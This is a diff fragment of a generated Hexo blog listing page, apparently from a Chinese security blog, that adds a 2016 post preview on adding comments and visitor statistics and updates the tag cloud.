+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Hexo站点优化" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/08/Hexo站点优化/">Hexo站点优化</a>
+    </h1>
+  
+      
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>上一篇博客中介绍了Hexo的站点配置及与GitHub的关联操作,这篇主要是介绍为Hexo博客添加多说评论以及增加访客统计功能~~</p>
+<ol>
+<li>0x1 添加多说评论<br>Hexo默认使用国外比较流行的dispus，在国内大多数用的是多说评论。支持一些国产，而且试了一下超级简单，分分钟就能搞定。</li>
+</ol>
+<p>首先，去多说官网注册一下。我直接用QQ号就能登录了，然后就是设置一些信息：<br>
+        <p class="article-more-link">
+          <a class="article-more-a"  href="/2016/11/08/Hexo站点优化/#more">more >></a>
+        </p>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2016/11/08/Hexo站点优化/" class="archive-article-date">
+  	<time datetime="2016-11-08T07:05:22.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-11-08</time>
+</a>
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hexo/">Hexo</a></li></ul>
+	</div>
+
+      
+
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+
+
+  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
@@ -777,7 +733,7 @@ var _hmt = _hmt || [];
     
     	<section class="tools-section tools-section-tag">
     			<div class="widget tagcloud" id="js-tagcloud">
-    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/神经网络/" style="font-size: 10px;">神经网络</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
     			</div>
     	</section>
     
